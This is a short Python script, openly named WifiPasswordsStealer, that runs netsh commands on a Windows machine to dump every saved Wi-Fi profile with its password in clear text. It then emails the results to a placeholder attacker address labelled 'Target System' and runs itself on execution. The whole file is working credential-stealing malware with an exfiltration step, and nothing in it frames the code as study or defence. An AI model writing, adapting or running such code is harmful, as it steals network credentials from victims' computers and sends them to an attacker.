import send_mails
import subprocess
import re
import sys


class WifiPasswordsStealer:
    def __init__(self):
        self.command = "netsh wlan show profile"
        self.network_names = ""
        self.mailer = send_mails.SendMails()

    def report(self, mail_body):
        self.mailer.send_mail("[ATTACKER EMAIL ID]", "Saved Wifi Passwords in Target System", mail_body)

    def get_network_names_list(self):
        try:
            networks = subprocess.check_output(self.command, shell=True, stderr=subprocess.STDOUT).decode()
            network_names_list = re.findall("(?:Profile\\s*:\\s*)(.*)\\r", networks)
            if network_names_list != []:
                return network_names_list
        except subprocess.CalledProcessError as e:
            self.network_names = f"Error during execution: {e}"

    def print_networks(self):
        network_names_list = self.get_network_names_list()
        if network_names_list:
            for network_name in network_names_list:
                command = 'netsh wlan show profile ' + '"' + network_name + '"' + ' key=clear'
                current_result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode()
                self.network_names += current_result
        else:
            self.network_names = "No saved wifi passwords on the system"

    def start(self):
        self.print_networks()
        self.report(self.network_names)
        sys.exit()


wifistealer = WifiPasswordsStealer()
wifistealer.start()
